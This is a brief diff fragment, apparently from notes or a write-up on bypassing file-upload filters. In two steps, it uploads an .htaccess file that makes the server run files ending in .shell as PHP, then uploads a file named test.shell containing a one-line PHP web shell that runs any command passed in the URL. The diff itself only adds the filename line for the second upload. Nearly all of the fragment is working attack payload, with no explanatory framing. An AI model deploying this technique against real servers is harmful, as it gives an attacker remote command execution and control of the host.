@@ -128,6 +128,7 @@ filename=".htaccess"
 Content-Type: text/plain
 AddType application/x-httpd-php .shell
 Step 2 >>
+filename="test.shell"
 Content-Type: application/x-httpd-php
 <?php system($_GET['cmd']); ?>
 ```
